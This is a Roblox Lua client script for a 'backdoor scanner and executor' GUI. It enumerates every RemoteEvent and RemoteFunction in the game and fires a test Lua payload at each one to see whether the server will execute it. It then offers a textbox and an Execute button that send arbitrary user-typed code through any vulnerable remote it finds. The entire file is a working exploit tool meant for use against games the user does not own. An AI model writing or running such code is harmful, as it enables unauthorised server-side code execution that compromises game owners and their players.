local Players = game:GetService("Players")
local CollectionService = game:GetService("CollectionService")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

while not Players.LocalPlayer do
    task.wait()
end
local player = Players.LocalPlayer

local ExecuteWork = false
local backdoor

local function generateRandomString(length)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local result = ""
    for i = 1, length do
        local idx = math.random(1, #chars)
        result = result .. chars:sub(idx, idx)
    end
    return result
end

local CD = generateRandomString(10)

local function runRemote(remote, data)
    if not remote then
        return false, "no remote"
    end
    if remote:IsA("RemoteEvent") then
        local ok, err = pcall(function() remote:FireServer(data) end)
        if not ok then
            return false, tostring(err)
        end
        return true, "fired"
    elseif remote:IsA("RemoteFunction") then
        local ok, ret = pcall(function() return remote:InvokeServer(data) end)
        if not ok then
            return false, tostring(ret)
        end
        return true, ret
    end
    return false, "unsupported remote type"
end

local function findRemotes()
    local remotes = {}
    local function scan(parent)
        for _, obj in ipairs(parent:GetChildren()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remotes, obj)
            elseif obj:IsA("Folder") or obj:IsA("Model") then
                scan(obj)
            end
        end
    end
    if game.Workspace then scan(game.Workspace) end
    if game.ReplicatedStorage then scan(game.ReplicatedStorage) end
    return remotes
end

local playerGui = player:WaitForChild("PlayerGui")
local existing = playerGui:FindFirstChild("noob")
if existing then existing:Destroy() end

local noob = Instance.new("ScreenGui")
noob.Name = "noob"
noob.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
noob.ResetOnSpawn = false
noob.Parent = playerGui
CollectionService:AddTag(noob, "main")
noob:SetAttribute("ScannerID", CD)

local Frame = Instance.new("Frame")
Frame.Name = "Frame"
Frame.Size = UDim2.new(0.47593, 0, 0.74392, 0)
Frame.Position = UDim2.new(0.26164, 0, 0.0434, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0.5
Frame.BorderSizePixel = 0
Frame.Parent = noob

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.836, Color3.fromRGB(0, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
})
UIGradient.Parent = Frame

local UIDragDetector = Instance.new("UIDragDetector")
UIDragDetector.DragUDim2 = UDim2.new(0, 14, 0, 0)
UIDragDetector.Parent = Frame

local txtbox = Instance.new("TextBox")
txtbox.Name = "txtbox"
txtbox.MultiLine = true
txtbox.ClearTextOnFocus = false
txtbox.Size = UDim2.new(0.95812, 0, 0.69167, 0)
txtbox.Position = UDim2.new(0.02094, 0, 0.04167, 0)
txtbox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
txtbox.BackgroundTransparency = 0.8
txtbox.TextColor3 = Color3.fromRGB(255, 255, 255)
txtbox.TextXAlignment = Enum.TextXAlignment.Left
txtbox.TextYAlignment = Enum.TextYAlignment.Top
txtbox.TextSize = 12
txtbox.Font = Enum.Font.SourceSans
txtbox.Parent = Frame

local Execute = Instance.new("TextButton")
Execute.Name = "Execute"
Execute.Text = "Execute"
Execute.Size = UDim2.new(0.22513, 0, 0.14167, 0)
Execute.Position = UDim2.new(0.04712, 0, 0.78333, 0)
Execute.BackgroundColor3 = Color3.fromRGB(41, 41, 41)
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.BorderSizePixel = 0
Execute.Parent = Frame
Instance.new("UICorner", Execute)

local Clear = Instance.new("TextButton")
Clear.Name = "Clear"
Clear.Text = "Clear"
Clear.Size = UDim2.new(0.22513, 0, 0.14167, 0)
Clear.Position = UDim2.new(0.31414, 0, 0.78333, 0)
Clear.BackgroundColor3 = Color3.fromRGB(41, 41, 41)
Clear.TextColor3 = Color3.fromRGB(255, 255, 255)
Clear.BorderSizePixel = 0
Clear.Parent = Frame
Instance.new("UICorner", Clear)

Clear.MouseButton1Click:Connect(function()
    txtbox.Text = ""
end)

local Inject = Instance.new("TextButton")
Inject.Name = "Inject"
Inject.Text = "Inject"
Inject.Size = UDim2.new(0.22513, 0, 0.14167, 0)
Inject.Position = UDim2.new(0.56545, 0, 0.78333, 0)
Inject.BackgroundColor3 = Color3.fromRGB(41, 41, 41)
Inject.TextColor3 = Color3.fromRGB(255, 255, 255)
Inject.BorderSizePixel = 0
Inject.Parent = Frame
Instance.new("UICorner", Inject)
Instance.new("UICorner", Frame)

local function tryRegister()
    local registerRemote = ReplicatedStorage:FindFirstChild("RegisterScanner")
    if registerRemote and registerRemote:IsA("RemoteEvent") then
        pcall(function() registerRemote:FireServer(CD) end)
    end
end

Inject.MouseButton1Click:Connect(function()
    if ExecuteWork then
        StarterGui:SetCore("SendNotification", {
            Title = "Already Injected",
            Text = "A backdoor was already detected.",
            Duration = 4
        })
        return
    end

    local found = findRemotes()
    if #found == 0 then
        StarterGui:SetCore("SendNotification", {
            Title = "No Backdoor Found ðŸ˜­",
            Text = "No remotes found.",
            Duration = 4
        })
        return
    end

    local startTime = tick()
    local payload = 'local a = Instance.new("Model", workspace) a.Name = "'..CD..'"'
    local foundModel = false
    local perRemoteTimeout = 0.6
    for _, remote in ipairs(found) do
        if ExecuteWork then break end
        local ok, res = runRemote(remote, payload)
        local t0 = tick()
        while tick() - t0 < perRemoteTimeout do
            if workspace:FindFirstChild(CD) then
                foundModel = true
                backdoor = remote
                ExecuteWork = true
                break
            end
            task.wait(0.05)
        end
        if foundModel then
            local elapsed = tick() - startTime
            StarterGui:SetCore("SendNotification", {
                Title = "Backdoor Found!",
                Text = "The game has a backdoor. Backdoor was found in "..string.format("%.2f", elapsed).." seconds",
                Duration = 5
            })
            tryRegister()
            break
        end
    end

    if foundModel then
        return
    end

    local broadcastPayloadDelay = 0.01
    task.wait(broadcastPayloadDelay)
    for _, remote in ipairs(found) do
        runRemote(remote, payload)
    end

    local totalTimeout = 8
    local conn
    local t0 = tick()
    conn = workspace.DescendantAdded:Connect(function(obj)
        if obj.Name == CD and not ExecuteWork then
            ExecuteWork = true
            backdoor = found[1]
            if conn then conn:Disconnect() end
            local elapsed = tick() - startTime
            StarterGui:SetCore("SendNotification", {
                Title = "Backdoor Found!",
                Text = "The game has a backdoor. Backdoor was found in "..string.format("%.2f", elapsed).." seconds",
                Duration = 5
            })
            tryRegister()
        end
    end)

    while not ExecuteWork and tick() - t0 < totalTimeout do
        task.wait(0.05)
    end

    if conn then conn:Disconnect() end

    if not ExecuteWork then
        StarterGui:SetCore("SendNotification", {
            Title = "No Backdoor Found ðŸ˜­",
            Text = "No backdoor was created by any remote.",
            Duration = 5
        })
    end
end)

Execute.MouseButton1Click:Connect(function()
    if not ExecuteWork then
        StarterGui:SetCore("SendNotification", {
            Title = "Error",
            Text = "You didn't inject yet.",
            Duration = 5
        })
        return
    end
    local code = txtbox.Text
    if code ~= "" and backdoor then
        runRemote(backdoor, code)
    end
end)
